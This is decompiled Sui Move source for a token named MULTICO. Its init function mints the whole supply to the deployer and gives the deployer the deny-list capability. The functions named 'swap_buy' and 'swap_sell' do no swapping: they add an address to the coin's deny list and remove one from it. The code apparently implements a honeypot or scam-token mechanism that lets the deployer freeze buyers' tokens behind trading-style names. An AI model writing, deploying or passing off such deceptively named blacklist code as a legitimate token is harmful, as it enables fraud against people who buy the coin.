module 0x68ee775b4299a51a978a8f60d71e36282e3c7bce182572ddf68c04d61f56779c::multico {
    struct MULTICO has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MULTICO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MULTICO>(arg0, 9, b"MULTICO", b"MULTICO", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmb8AHv47Jydc9hLdRqH5unsRriS6Sg43YoPt3Tsk9x5rq"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MULTICO>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MULTICO>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MULTICO>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MULTICO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MULTICO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MULTICO>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MULTICO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MULTICO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

